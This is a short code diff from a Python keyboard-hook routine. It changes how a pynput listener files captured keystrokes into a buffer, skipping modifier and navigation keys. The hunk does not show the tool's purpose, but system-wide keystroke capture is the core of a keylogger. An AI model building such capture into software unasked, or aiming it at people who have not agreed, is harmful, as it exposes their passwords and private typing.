@@ -38,12 +38,20 @@ def _hook():
                 _buffer.pop()
             elif key == keyboard.Key.esc:
                 _buffer.append('[ESC]')
-            else:
-                k = str(key).replace('Key.', '[')
-                if k in ['[shift]', '[ctrl]', '[alt]', '[cmd]']:
-                    pass  # bo qua phim modifier
+            elif key == keyboard.Key.delete:
+                pass  # bo qua
+            elif hasattr(key, 'name') and key.name:
+                # Bo qua tat ca phim modifier + mui ten
+                name = key.name.lower().replace('_l','').replace('_r','')
+                if name in ['shift', 'ctrl', 'alt', 'cmd', 'capslock',
+                           'up', 'down', 'left', 'right', 'home', 'end',
+                           'page_up', 'page_down', 'insert', 'print_screen',
+                           'numlock', 'scrolllock', 'pause', 'menu',
+                           'f1','f2','f3','f4','f5','f6',
+                           'f7','f8','f9','f10','f11','f12']:
+                    pass
                 else:
-                    _buffer.append(f'<{k}>')
+                    _buffer.append(f'<{name}>')
         except:
             pass
 
